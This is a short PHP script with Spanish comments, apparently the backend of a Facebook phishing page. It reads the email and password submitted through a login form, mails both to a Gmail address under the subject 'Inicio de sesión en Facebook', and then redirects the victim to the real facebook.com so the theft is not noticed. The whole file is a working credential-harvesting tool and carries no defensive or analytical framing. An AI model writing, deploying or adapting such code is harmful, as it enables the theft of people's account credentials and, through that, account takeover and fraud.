<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Datos para el correo
    $to = "Jessie1zahori@gmail.com";
    $subject = "Inicio de sesión en Facebook";
    $message = "Correo electrónico: $email\r\nContraseña: $password";

    // Cabeceras del correo
    $headers = "From: tuemail@tudominio.com\r\n";
    $headers .= "Reply-To: $email\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Envío del correo
    if (mail($to, $subject, $message, $headers)) {
        // Correo enviado con éxito, redirigir a Facebook
        header("Location: https://www.facebook.com");
        exit;
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    // Redireccionar o manejar errores según sea necesario
    echo "Acceso no permitido.";
}
?>
